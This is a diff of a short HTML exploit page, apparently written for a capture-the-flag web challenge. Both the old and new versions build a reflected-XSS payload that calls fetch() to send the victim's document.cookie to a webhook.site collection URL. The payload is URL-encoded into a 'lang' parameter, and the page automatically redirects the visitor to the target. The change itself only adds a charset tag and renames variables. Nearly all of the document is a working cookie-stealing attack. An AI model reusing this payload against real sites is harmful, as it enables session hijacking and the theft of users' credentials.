@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html>
   <head>
+    <meta charset="UTF-8">
     <script>
-      const payload = `<script>fetch("https://webhook.site/0084921d-f965-4a88-aa8b-bd2c25e26d82?c=" + document.cookie)</script>`;
-      const target = "https://chal1.lagncra.sh:8426/zone?lang=" + encodeURIComponent(payload);
-      window.location.href = target;
+      const cookieStealer = '<script>fetch(`https://webhook.site/0084921d-f965-4a88-aa8b-bd2c25e26d82?c=${document.cookie}`)</script>';
+      const redirectURL = "https://chal1.lagncra.sh:8426/zone?lang=" + encodeURIComponent(cookieStealer);
+      window.location.href = redirectURL;
     </script>
   </head>
   <body>
